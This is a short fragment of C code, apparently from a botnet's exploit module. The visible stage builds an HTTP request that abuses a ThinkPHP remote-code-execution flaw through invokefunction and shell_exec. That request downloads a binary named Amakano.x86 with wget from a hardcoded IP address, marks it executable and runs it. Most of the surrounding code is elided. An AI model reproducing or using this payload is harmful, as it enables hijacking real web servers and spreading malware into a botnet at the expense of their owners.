            ...
            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if (err == 0 && ret == 0)
                {
                    if (conn->state == thinkphp_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "GET public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://188.166.41.194/vb/Amakano.x86;cat%20Amakano.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp");
